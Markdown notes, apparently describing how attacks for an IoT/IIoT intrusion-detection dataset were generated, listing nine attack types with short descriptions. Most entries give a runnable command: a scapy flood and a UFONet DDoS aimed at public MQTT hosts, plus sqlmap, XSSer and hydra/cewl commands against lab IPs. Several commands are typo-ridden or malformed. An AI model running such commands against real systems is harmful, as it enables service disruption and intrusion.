### 1. Scanning attack
- Collect infos abou victim systems uch as finding active IP addresses and open ports
### 2. DoS attack
- Fake flodding that attempts to corrupt resources of #Iot-IIot services  and network sys
- Python script using *scapy* package `send(IP(src=srcip, dst="broker.hivemq.com", ttl=rnd2)/ TCP(sport=port,dport=port, ack=rnd, window=rnd), count=100)`
### 3. DDoS attack
- Launches multiple DDoS attacks to corrupt targeted sys, turning rach one into a bot or zombie
- The attacker then had remote control over the group of bots named a botnet
- Bash script `python2 ./ufonet-a "http://www.mqtt-dashboard.com"-r "100"- loic "1000"--loris "1000"--ufosyn "1000"--spray "1000"--smurf "1000"--xmas "1000"--nuke "1000"--tachyon "1000"--threads "100"`
### 4. Ransomware attack
- Prevents normal users to access sys or services by encrypting them until they pay a ransom
- Executed by Metasploit framework named *eternalblue*
### 5. Backdoor attack
- Gain high-lecel user access and keep persistence to the hacked sys
- Executed bby metasploit framework *bash script* of command `run persistence -h`
### 6. Injection attack
- Injects or inserts any fake data from clients to applications
- Using *bash script* `sqlmap-u http://192.168.1.195/dvwa/ vulnerabilities/sqli/?id=53`
### 7. Cross-site scripting (XSS)
- Employs a web app to transmit malicious code
- Using the *XSSer* `python2 xsser-u "https://192.168.1.184/index.jsp"--auto--Cem "Hex,Str,Hex"--user-agent "hacking"--timeout "20"--threads "5"`
### 8. Password cracking attack
- Brute-force and dictionary attacks
- Using *hydra* and *cewl* `hydra-l root-P /usr/share/wordlists/metasploit/unix_passwords.txt-t 5 ftp://192.168.1.152, and cewl http://192.168.1.195/dvwa--auth_type Digest--auth_user admin--auth_pass password-v`
### 9. MITM attack
- Snoop as one of the parties
- Using *Ettercapp* to execute ARP spoofing, ICMP redirection, port straling and DHCP spoofing